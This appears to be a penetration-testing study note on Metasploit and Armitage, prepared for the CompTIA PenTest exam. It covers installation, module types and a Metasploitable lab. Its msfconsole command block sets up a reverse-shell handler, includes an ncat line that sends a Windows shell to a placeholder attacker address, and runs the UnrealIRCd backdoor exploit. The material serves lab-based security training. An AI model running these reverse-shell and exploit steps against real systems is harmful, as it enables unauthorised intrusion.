<h5><em>Update: Aug-2022</em></h5>

<h2> Metasploit (cc. Armitage)</h2>

-   The most popular exploitation framework in the industry

<h3> Metasploit Project Intro.</h3>

<i>Refer to -> https://www.metasploit.com/</i>

<i>Tutorial: https://www.offensive-security.com/metasploit-unleashed/introduction/</i>

<h4> Installation</h4>

-   msf: CLI based Metasploit framework (Kali Linux default program)
-   Armitage: Java-based GUI front-end for the Metasploit framework

    ```sh
    # metasploit (mfsconsole): Kali Linux default
    # Armitage: need install
    sudo apt install armitage

    ```

<h4> Modules</h4>

1. Exploits: modules that use payloads
2. Auxiliary: port scanners, fuzzers, sniffers, and more
3. Payloads: code that runs remotely
4. Encoders: Ensure that payloads make it to their destination intact
5. Nops: Keep the payload sizes consistent across exploit attempts
   <br/>

<h4> Lab Environment: Metasploitable</h4>

[Metasploitable 2 Exploitability Guide](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)

[Metasploitable 2 from SourceForge](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)

<h6><font color="red"> *** Never expose Metasploitable to an untrusted network, use NAT or Host-only mode ! ***</font></h6>
   <br/>

<h4> <font color="blue">msf</font> CLI</h4>

```sh
service postgresql start
msfdb init
msfconsole
banner
help

show exploits
show options
show payloads
show targets
show info

# use "module-name-you-want-to-use"
use exploit/windows/browser/adobe_flash_avm2
show options
set SRVPORT 80
set SRVHOST 192.168.0.1
exploit
back
exit


# search specific exploits matching keywords
search type:exploit platform:windows flash
search mysql

# Example-1: reverse shell connection to a Windows machine
use exploit/multi/handler
show options
set PAYLOAD generic/shell_reverse_tcp
set LHOST xx.xx.xx.xx
set LPORT pppp
show options
exploit

# if the target is a Windows machine
>> ncat -nv xx.xx.xx.xx pppp -e powershell or cmd

# Example-2: vulerable IRC server (need to be pre-identified)
use exploit/unix/irc/unreal_ircd_3182_backdoor
show payloads
set PAYLOAD payload/cmd/unix/reverse
show options
set LHOST xx.xx.xx.xx
set RHOST xx.xx.xx.xx
show options
exploit


### CompTIA PenTest Reference


```
